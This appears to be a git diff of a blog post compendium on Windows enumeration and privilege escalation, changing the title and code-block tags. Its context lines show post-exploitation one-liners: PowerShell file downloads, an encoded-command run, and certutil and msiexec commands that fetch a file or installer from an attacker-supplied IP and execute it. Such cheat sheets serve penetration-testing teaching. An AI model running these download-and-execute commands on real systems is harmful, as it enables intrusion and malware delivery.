@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Windows enum and privesc: Tricks and tools compendium"
+title: "Windows enumeration: Tricks and tools compendium"
 categories: [ENUMERATION,WINDOWS,PRIVESC]
 ---
 
@@ -93,7 +93,7 @@ end
 Maybe if we get RCE with some of beforementioned ways, it'll be a "stub" shell, maybe with no keys support so, here is a bit of powershell tricks:
 
 ## Powershell
-```pwsh
+```powershell
 
 # Download file one liners
 (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
@@ -109,7 +109,7 @@ powershell -EncodedCommand <base64_cmd>
 ```
 
 ## Another ways to download or execute files remotely
-```
+```powershell
 # Certutil
 certutil.exe -urlcache -split -f "http://<ip>/object" C:\\tmp\\program.exe && C:\\tmp\\program.exe
 
@@ -123,7 +123,7 @@ msiexec /q /i http://<ip>/test.msi
 
 Now... we got a low priv shell, what can we do?
 
-```
+```powershell
 #Check systeminfo
 systeminfo
 hostname
